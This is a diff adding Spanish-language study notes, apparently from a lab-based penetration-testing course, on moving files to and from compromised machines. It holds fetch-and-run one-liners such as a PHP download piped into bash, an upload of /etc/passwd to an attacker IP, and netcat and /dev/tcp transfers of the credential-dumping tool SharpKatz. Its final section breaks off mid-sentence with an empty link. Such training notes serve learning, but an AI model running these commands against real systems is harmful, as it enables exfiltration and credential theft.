@@ -422,12 +422,196 @@ Muchas compañias utilan ssh (22) para las conexiones y para subir archivos nece
  scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
 ```
 
+# TRANSFERIR ARCHIVOS CON CODIGO
 
+Es muy comun que en diferentes lenguajes de programacion. Como Python,PHP,Perl y ruby esten en linux o windows.
 
+Usaremos aplicaciones predefinidar de windows y linux
 
+## PYTHON
 
+Es un lenguaje de programación famoso version 3 
 
+### DESCARGAR
+```
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+## PHP
+Transferencia de multiples archivos se usa el 77 porciento de las ocasiones en servdores.
+Ejemplos
+```
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
 
+### OTROS LENGUAJES
 
+```
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+## JAVA SCRIPT
+
+```
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+## VBScript
+
+VBScript ("Microsoft Visual Basic Scripting Edition") 
+
+```
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+### SUBIR OPERACIONES CON PYTHON 3
+
+Si queremos subir un archivo, debemos entender como funciona
+
+```
+python3 -m uploadserver
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/d86a6599-be84-4baf-917f-bd80cd8f32fd)
+
+# OTRAS FORMAS DE TRANSFERENCIA DE ARCHIVOS
+
+Ya hemos comentado varias formas sea windows os linux. Hasta usando diferentes lenguajes de programación.
+
+En esta sección trataremos usando Netact, Ncat y usando RDP
+
+## NETCAT
+
+Abreviación de nc es una utilizar del ordenador en red para leer y escribir utilziando conexion TCP o UDP para transferir operaciones.
+
+### TRANSFERENCIA CON NETCAT Y NCAT
+
+El target se usa para iniciar la conexion, el firewall previene el acceso
+
+EN este ejemplo equeremos meter un .exe para compremeter el archivos. Tenemos dos metodos
+
+Primero usando Netcat (nc) con la opcion -l y el puerto -p 8000 y redirigiendo
+
+```
+nc -l -p 8000 > SharpKatz.exe
+```
+Podemos especificar "--recv-only" para cerrar la conexion
+```
+ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+
+Del host atacante, nosotros podemos conectarnos en el puerto 8000 usando netcan y mandando ficheros con la opcion -q 0 le dices a netcat que cierre la conexión al final.
+
+### Netcat - Mandar ficheros para comprometer una maquina
+
+```
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
+
+utilizando Ncat en nuestra maquina host, nosotros optamos por "--send-only" solo lo manda una veez apra que no reviente
+```
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+
+Una vez que la maquina esta comprometia, nosotros nos conectamos por el puerto para transferir archivos y poner un litsner 
+```
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+nc 192.168.49.128 443 > SharpKatz.exe
+```
+
+### MANDAR FICHEROS CON NCAT
+```
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+### RECIBIR ARCHIVO
+```
+ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+
+### NETCAT MANDAR FICHERO TO NETCAT
+
+```
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+## POWERSHELL TRANSFERENCIA DE SESION
+
+Vamos a hablar sobre hacer transfeencia de archivos con powerhsell, pero hay muchos mas escenarios como HTTP, HTTPS o MSB que estan validos, en este caso, nosotros usamos "Remoting PowerShell" (WinRM) para transferir.
+
+El powerShell rmeoto hacer que podamos ejecutar scripts o comandos en un ordenador remoto usando una sesion de PowerShell. Los administradores comunmente usamos remotamente PowerShell para manejar remotamente los rodenadores de lared, y nosotros transferimos las operaciones, 
+
+Para crear una powershell remota en un ordeandor remoto, necesitaremos acceso de adminsitrador , los miembros de grupo necesitara permisos explicitos, vamos a crear una transferecia de ficheros.
+
+Tenemos uan sesión de adminsitrador, el usuaro administrar y el powershell remoting es enable
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/bdb59dcc-7806-4d1f-b06c-7ef770d933a5)
+
+No especifica credenciales vamos a crear un ordenador remoto
+```
+$Session = New-PSSession -ComputerName DATABASE01
+```
+Usaremos "Copy-Item" de nuestra máuqina local para hacer una sesion
+```
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+### RDP
+
+Es comunmente usado para acceder remotamente a las redes de windows. Podemos trasferir copiar, pegar, etc. 
+
+Si estamos conectados desde linux, tenemos xfreerdp o rdesktop. 
+
+```
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/6fd3bae4-1e24-4421-a7ff-a90d8d38f07e)
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/45fb7b1c-c39b-4f86-9376-f82ea680ff13)
+
+## PRACTICE MAKES PERFECT
+
+Es rentable que en esta scecion creemos nuestras propias notas y tecnicas
+
+1- Active directory
+2- Pivoting, Tunelling y Port Forwarding
+3- Ataque de redes
+4 - Shell y payloads
+
+# PROTECCIÓN EN LA TRASFERENCIA DE FICHEROS
+
+Un penetration testes, puede tener acceso y ganar datos sensibles, credenciales etc, Es esencial encriptar la informacion y utilizar conexiones de SSH,SFTP y HTTPS.
+
+Antes, los datos encriptados y arhcivos antes de la transferencia necesitaban estar prevenidos 
+
+Durante un test de pentracion, debes actuar como profesional.
+
+## ENCRIPTACION EN WINDOWS
+
+Mucos metodos diferentes se usan para encriptar ficheros y informacion de los sistemas Windows. Un metodo simple es con [Invoke-AESEcmoto ]()
 
 
